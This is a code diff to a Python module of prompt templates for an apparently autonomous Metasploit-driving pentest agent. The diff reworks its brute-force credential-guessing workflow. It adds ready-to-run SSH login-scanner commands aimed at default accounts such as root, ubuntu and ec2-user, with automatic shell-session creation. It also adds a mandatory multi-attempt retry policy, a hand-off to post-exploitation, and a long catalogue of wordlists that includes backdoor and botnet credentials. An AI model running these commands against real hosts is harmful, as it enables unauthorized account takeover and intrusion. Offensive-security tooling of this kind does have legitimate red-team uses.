@@ -8,7 +8,7 @@ from .base import METASPLOIT_CONSOLE_HEADER
 
 
 # =============================================================================
-# BRUTE FORCE CREDENTIAL GUESS TOOLS (9-step workflow with verification)
+# BRUTE FORCE CREDENTIAL GUESS TOOLS (Multi-attempt workflow with OS detection)
 # =============================================================================
 
 BRUTE_FORCE_CREDENTIAL_GUESS_TOOLS = METASPLOIT_CONSOLE_HEADER + """
@@ -17,22 +17,40 @@ BRUTE_FORCE_CREDENTIAL_GUESS_TOOLS = METASPLOIT_CONSOLE_HEADER + """
 **CRITICAL: This objective has been CLASSIFIED as brute force credential guessing.**
 **You MUST follow the brute force workflow below. DO NOT switch to other attack methods.**
 
-**IMPORTANT: Skip reconnaissance - go DIRECTLY to Step 1!**
-- Do NOT query the graph for usernames or credentials
-- Do NOT explore other services on the target
-- Use the default wordlists provided in Step 4
-- Start immediately with Step 1: Select the login scanner module
+---
+
+## RETRY POLICY
+
+**Maximum wordlist attempts: {brute_force_max_attempts}**
+
+If brute force fails with one wordlist strategy, you MUST try different wordlists up to {brute_force_max_attempts} times:
+- **Attempt 1**: OS/Cloud-aware username + common passwords (based on detected technologies)
+- **Attempt 2**: General comprehensive (unix_users.txt + unix_passwords.txt)
+- **Attempt 3**: Service-specific defaults (if available for the service)
+
+**DO NOT give up after first failure!** Track attempts in your TODO list.
 
 ---
 
 ## MANDATORY BRUTE FORCE CREDENTIAL GUESS WORKFLOW
 
-**This is the SINGLE SOURCE OF TRUTH for brute force credential guess attacks.**
-**NEVER guess module names!** Use the appropriate protocol-specific login module.
+### Step 0: Gather Target Context (BEFORE exploitation)
 
-Complete ALL 9 steps in order (ONE COMMAND PER CALL):
+**Check `target_info.technologies` in the prompt context for OS/platform hints.**
+
+Look for keywords like:
+- `Ubuntu`, `Debian`, `CentOS`, `RHEL`, `Amazon Linux` → Linux variants
+- `Windows Server`, `Windows 10/11` → Windows
+- `Apache`, `nginx`, `OpenSSH` → Service versions may hint at OS
+- Cloud indicators in IP/hostname → AWS, Azure, GCP
+
+**If target_info.technologies is empty or unclear:**
+1. Query the graph: `"What technologies are detected on <target-ip>?"`
+2. Or use naabu with service detection: `-host <ip> -p <port> -json`
+3. Check SSH banner if targeting SSH (often reveals OS)
 
 ### Step 1: Select the login scanner module
+
 Based on the target service:
 
 | Service | Port | Module |
@@ -61,108 +79,119 @@ Based on the target service:
 ### Step 2: Show options
 `show options` -> Display all configurable parameters
 
-### Step 3: Set target
-- `set RHOSTS <target-ip>` -> Target IP or range
-- `set RPORT <port>` -> Target port (if non-default)
+### Step 3: Configure ALL settings in ONE metasploit_console call
 
-### Step 4: Configure credentials
+**CRITICAL SYNTAX RULES:**
+- Use `;` (semicolons) to chain multiple `set` commands - this WORKS in msfconsole!
+- **DO NOT use `&&` or `||`** - these are SHELL operators that msfconsole does NOT understand!
+- Include ALL configuration in ONE metasploit_console call
 
-**Choose ONE method based on available information:**
+#### SSH Brute Force Templates (Attempt 1 - OS-Aware):
 
-**Option A: Single credential test**
-Use when you have specific credentials to try:
+**Ubuntu/Debian (including AWS EC2):**
 ```
-set USERNAME <user>
-set PASSWORD <pass>
-```
-
-**Option B: User list with password list**
-Use for comprehensive brute force:
-```
-set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
-set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set RHOSTS <ip>; set RPORT 22; set USERNAME ubuntu; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
 ```
 
-**Option C: Combined userpass file (username:password per line)**
-Use for known credential pairs or service-specific defaults:
+**Amazon Linux/AWS:**
 ```
-set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
-```
-
-**Service-Specific Wordlist Recommendations:**
-| Service | Recommended Wordlist | Description |
-|---------|----------------------|-------------|
-| SSH | `/usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt` | SSH-specific username:password combos |
-| Tomcat | `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt` | Tomcat Manager default credentials |
-| MSSQL | `/usr/share/metasploit-framework/data/wordlists/mssql_default_userpass.txt` | MSSQL default credentials |
-| PostgreSQL | `/usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt` | PostgreSQL default credentials |
-| Oracle | `/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt` | Oracle DB default credentials |
-| VNC | `/usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt` | Common VNC passwords (password only) |
-| Quick Spray | `/usr/share/metasploit-framework/data/wordlists/burnett_top_1024.txt` | Top 1024 most common passwords |
-| General Users | `/usr/share/metasploit-framework/data/wordlists/unix_users.txt` | Common Unix usernames |
-| General Passwords | `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` | Common Unix passwords |
-
-**To list available wordlists:**
-```
-ls /usr/share/metasploit-framework/data/wordlists/
+set RHOSTS <ip>; set RPORT 22; set USERNAME ec2-user; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
 ```
 
-### Step 5: Set brute force options
+**Generic Linux (root):**
+```
+set RHOSTS <ip>; set RPORT 22; set USERNAME root; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_roots.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+```
+
+**Windows:**
+```
+set RHOSTS <ip>; set RPORT 22; set USERNAME Administrator; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+```
+
+#### Template for General Comprehensive (Attempt 2 - if Attempt 1 fails):
+```
+set RHOSTS <ip>; set RPORT 22; set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+```
+
+#### Template for Service-Specific (Attempt 3 - if Attempt 2 fails):
+```
+set RHOSTS <ip>; set RPORT 22; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+```
+
+**Configuration options explained:**
+- **STOP_ON_SUCCESS=true**: Stop immediately when valid credentials found
+- **VERBOSE=true**: Show all login attempts (enables 2-min timeout detection)
+- **CreateSession=true**: Automatically open shell session on success (SSH only)
+
+**Speed settings (optional, add to command if needed):**
 ```
 set BRUTEFORCE_SPEED 3
-set STOP_ON_SUCCESS true
 ```
 
-**Speed settings:**
-- 0: Very slow, stealthy (1 attempt per 30 seconds) - use to avoid detection/lockout
-- 1-2: Slow, low profile
-- 3: Medium speed (default, balanced) - recommended for most cases
-- 4: Fast - may trigger account lockouts
-- 5: Very fast - likely to trigger lockouts and detection
-
-**STOP_ON_SUCCESS:** Set to `true` to stop immediately when valid credentials are found.
-
-### Step 6: For SSH ONLY - Enable session creation
-**CRITICAL for SSH brute force with post-exploitation!**
+### Step 4: Verify configuration (OPTIONAL but recommended)
 ```
-set CreateSession true
+show options
 ```
-This creates a shell session when credentials are found.
+Verify all settings are correct before running.
 
-**Note:** Only SSH supports automatic session creation. For other services (FTP, SMB, databases),
-you get the credentials but no interactive session.
+### Step 5: Execute (SEPARATE CALL!)
+**In a NEW metasploit_console call, run the attack:**
+```
+run
+```
 
-### Step 7: Execute
-`run` -> **NOT "exploit"!**
+**IMPORTANT:** The `run` command MUST be in a SEPARATE tool call from the `set` commands!
 
 The module runs synchronously. Wait for completion indicators in the output:
 - `[*] Scanned X of Y hosts (100% complete)` -> Brute force finished
 - `[+] <ip>:22 - Success: 'user:password'` -> Credentials found!
 - `[*] SSH session X opened` -> Session created (if CreateSession=true)
 
-### Step 8: Verify Session (MANDATORY after run)
+### Step 6: Verify Results (MANDATORY after run)
 
-**IMMEDIATELY after `run` completes, run:**
+**IMMEDIATELY after `run` completes, check for sessions:**
 ```
 sessions -l
 ```
 
-**Interpreting output:**
-- If sessions listed (e.g., `1  shell linux  SSH user:pass...`): Note the session ID, proceed to Step 9
-- If "No active sessions": Credentials may have been found but session failed - check Step 8b
-
-### Step 8b: Verify Credentials (if no session)
-
-If `sessions -l` shows no sessions, check credentials database:
+**Then check credentials database:**
 ```
 creds
 ```
 
-**Output format:** `host:port service public private realm private_type`
-- If credentials listed: Attack succeeded, inform user of discovered credentials
-- If no credentials: Attack failed, no valid credentials found
+**Interpreting results:**
 
-### Step 9: Post-Exploitation Transition
+| Sessions | Credentials | Result | Action |
+|----------|-------------|--------|--------|
+| Yes | Yes | SUCCESS | Proceed to Step 7 |
+| No | Yes | PARTIAL SUCCESS | Report credentials, action="complete" |
+| No | No | FAILED | **RETRY with different wordlist!** |
+
+### Step 6b: RETRY LOGIC (if no credentials found)
+
+**If no sessions AND no credentials found:**
+
+1. Check your current attempt number (track in TODO list)
+2. If attempts < {brute_force_max_attempts}: Go back to **Step 3** with next wordlist strategy
+3. If attempts >= {brute_force_max_attempts}: Report failure with action="complete"
+
+**Retry workflow - reconfigure with semicolons:**
+```
+unset USER_FILE; unset PASS_FILE; unset USERNAME; set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+Then in separate call:
+```
+run
+```
+
+**Track attempts in TODO list:**
+```
+1. [x] Attempt 1: ubuntu + unix_passwords.txt - FAILED
+2. [~] Attempt 2: unix_users.txt + unix_passwords.txt - IN PROGRESS
+3. [ ] Attempt 3: piata_ssh_userpass.txt - PENDING
+```
+
+### Step 7: Handle Success
 
 **If `sessions -l` shows active sessions:**
 1. Request phase transition to `post_exploitation` using action="transition_phase"
@@ -217,50 +246,153 @@ Use `action="complete"` after successfully discovering credentials.
 # =============================================================================
 
 BRUTE_FORCE_CREDENTIAL_GUESS_WORDLIST_GUIDANCE = """
-## Wordlist Selection Guide
+## Available Wordlists Reference
 
-### Built-in Metasploit Wordlists
-Location: `/usr/share/metasploit-framework/data/wordlists/`
+**Location:** `/usr/share/metasploit-framework/data/wordlists/`
 
-### General Purpose
-| File | Description | Size |
-|------|-------------|------|
-| `unix_users.txt` | Common Unix usernames | ~170 entries |
-| `unix_passwords.txt` | Common Unix passwords | ~1000 entries |
-| `password.lst` | General password list | ~2000 entries |
-| `burnett_top_1024.txt` | Top 1024 most common passwords | 1024 entries |
-| `common_roots.txt` | Common root passwords | ~50 entries |
+### General Purpose (Use for comprehensive brute force)
+| File | Description |
+|------|-------------|
+| `unix_users.txt` | Common Unix usernames (~170 entries) |
+| `unix_passwords.txt` | Common Unix passwords (~1000 entries) |
+| `password.lst` | General password list (~2000 entries) |
+| `burnett_top_1024.txt` | Top 1024 most common passwords |
+| `burnett_top_500.txt` | Top 500 most common passwords |
+| `common_roots.txt` | Common root passwords |
+| `keyboard-patterns.txt` | Keyboard pattern passwords (qwerty, 123456, etc.) |
+| `namelist.txt` | Common names used as passwords |
 
-### Service-Specific
-| File | Service | Description |
-|------|---------|-------------|
-| `piata_ssh_userpass.txt` | SSH | Username:password combos for SSH |
-| `tomcat_mgr_default_userpass.txt` | Tomcat | Tomcat Manager defaults |
-| `db2_default_userpass.txt` | IBM DB2 | DB2 default credentials |
-| `oracle_default_userpass.txt` | Oracle | Oracle DB defaults |
-| `postgres_default_userpass.txt` | PostgreSQL | PostgreSQL defaults |
-| `mssql_default_userpass.txt` | MSSQL | Microsoft SQL Server defaults |
-| `http_default_userpass.txt` | HTTP | HTTP Basic Auth defaults |
-| `vnc_passwords.txt` | VNC | Common VNC passwords |
-| `snmp_default_pass.txt` | SNMP | SNMP community strings |
+### SSH
+| File | Description |
+|------|-------------|
+| `piata_ssh_userpass.txt` | SSH username:password combos |
+| `root_userpass.txt` | Root user credentials |
 
-### IoT/Embedded
+### HTTP / Web Services
+| File | Description |
+|------|-------------|
+| `http_default_pass.txt` | HTTP default passwords |
+| `http_default_users.txt` | HTTP default usernames |
+| `http_default_userpass.txt` | HTTP user:pass combos |
+| `http_owa_common.txt` | Outlook Web Access common creds |
+| `joomla.txt` | Joomla CMS wordlist |
+| `wp-plugins.txt` | WordPress plugins |
+| `wp-themes.txt` | WordPress themes |
+| `wp-exploitable-plugins.txt` | Exploitable WordPress plugins |
+| `wp-exploitable-themes.txt` | Exploitable WordPress themes |
+
+### Tomcat
+| File | Description |
+|------|-------------|
+| `tomcat_mgr_default_pass.txt` | Tomcat Manager passwords |
+| `tomcat_mgr_default_users.txt` | Tomcat Manager usernames |
+| `tomcat_mgr_default_userpass.txt` | Tomcat Manager user:pass combos |
+
+### Databases
+| File | Description |
+|------|-------------|
+| `postgres_default_pass.txt` | PostgreSQL passwords |
+| `postgres_default_user.txt` | PostgreSQL usernames |
+| `postgres_default_userpass.txt` | PostgreSQL user:pass combos |
+| `oracle_default_userpass.txt` | Oracle DB defaults |
+| `oracle_default_passwords.csv` | Oracle password list |
+| `db2_default_pass.txt` | IBM DB2 passwords |
+| `db2_default_user.txt` | IBM DB2 usernames |
+| `db2_default_userpass.txt` | IBM DB2 user:pass combos |
+
+### VNC
+| File | Description |
+|------|-------------|
+| `vnc_passwords.txt` | Common VNC passwords |
+
+### SNMP
+| File | Description |
+|------|-------------|
+| `snmp_default_pass.txt` | SNMP community strings |
+
+### IPMI (Server Management)
+| File | Description |
+|------|-------------|
+| `ipmi_users.txt` | IPMI usernames |
+| `ipmi_passwords.txt` | IPMI passwords |
+
+### iDRAC (Dell Server Management)
+| File | Description |
+|------|-------------|
+| `idrac_default_user.txt` | iDRAC usernames |
+| `idrac_default_pass.txt` | iDRAC passwords |
+
+### Routers / Network Devices
+| File | Description |
+|------|-------------|
+| `routers_userpass.txt` | Router default credentials |
+| `dlink_telnet_backdoor_userpass.txt` | D-Link telnet backdoor creds |
+| `telnet_cdata_ftth_backdoor_userpass.txt` | CDATA FTTH backdoor creds |
+
+### CCTV / DVR
+| File | Description |
+|------|-------------|
+| `multi_vendor_cctv_dvr_users.txt` | CCTV/DVR usernames |
+| `multi_vendor_cctv_dvr_pass.txt` | CCTV/DVR passwords |
+
+### IoT / Embedded / Botnets
 | File | Description |
 |------|-------------|
 | `mirai_user.txt` | Mirai botnet usernames |
 | `mirai_pass.txt` | Mirai botnet passwords |
+| `mirai_user_pass.txt` | Mirai user:pass combos |
+| `vxworks_common_20.txt` | VxWorks common passwords |
+| `vxworks_collide_20.txt` | VxWorks collision passwords |
 
-### Wordlist Strategy
+### SCADA / Industrial
+| File | Description |
+|------|-------------|
+| `scada_default_userpass.txt` | SCADA default credentials |
 
-1. **Start with service-specific defaults** - Highest success rate for misconfigured services
-2. **Try top passwords first** - `burnett_top_1024.txt` for quick wins
-3. **Use targeted lists** - Match wordlist to service type
-4. **Full brute force last** - `unix_users.txt` + `unix_passwords.txt` if defaults fail
+### CMS / Applications
+| File | Description |
+|------|-------------|
+| `cms400net_default_userpass.txt` | CMS 400.NET defaults |
+| `grafana_plugins.txt` | Grafana plugins list |
+| `flask_secret_keys.txt` | Flask secret keys |
+| `superset_secret_keys.txt` | Apache Superset secret keys |
 
-### Custom Wordlists
-If built-in wordlists are insufficient, you can specify custom paths:
-```
-set USER_FILE /path/to/custom_users.txt
-set PASS_FILE /path/to/custom_passwords.txt
-```
+### SAP
+| File | Description |
+|------|-------------|
+| `sap_common.txt` | SAP common passwords |
+| `sap_default.txt` | SAP default credentials |
+| `sap_icm_paths.txt` | SAP ICM paths |
+
+### Other Services
+| File | Description |
+|------|-------------|
+| `rpc_names.txt` | RPC service names |
+| `rservices_from_users.txt` | R-services user mappings |
+| `sid.txt` | Oracle SID list |
+| `tftp.txt` | TFTP paths |
+| `named_pipes.txt` | Windows named pipes |
+| `lync_subdomains.txt` | Microsoft Lync subdomains |
+| `sensitive_files.txt` | Linux sensitive file paths |
+| `sensitive_files_win.txt` | Windows sensitive file paths |
+
+### Unhashed Defaults (for hash cracking context)
+| File | Description |
+|------|-------------|
+| `default_users_for_services_unhash.txt` | Default usernames |
+| `default_pass_for_services_unhash.txt` | Default passwords |
+| `default_userpass_for_services_unhash.txt` | Default user:pass |
+| `hci_oracle_passwords.csv` | Oracle HCI passwords |
+
+### Miscellaneous
+| File | Description |
+|------|-------------|
+| `adobe_top100_pass.txt` | Adobe breach top 100 |
+| `dangerzone_a.txt` | High-risk passwords (set A) |
+| `dangerzone_b.txt` | High-risk passwords (set B) |
+| `av-update-urls.txt` | Antivirus update URLs |
+| `av_hips_executables.txt` | AV/HIPS executable names |
+| `can_flood_frames.txt` | CAN bus flood frames |
+| `malicious_urls.txt` | Known malicious URLs |
+| `telerik_ui_asp_net_ajax_versions.txt` | Telerik UI versions |
 """
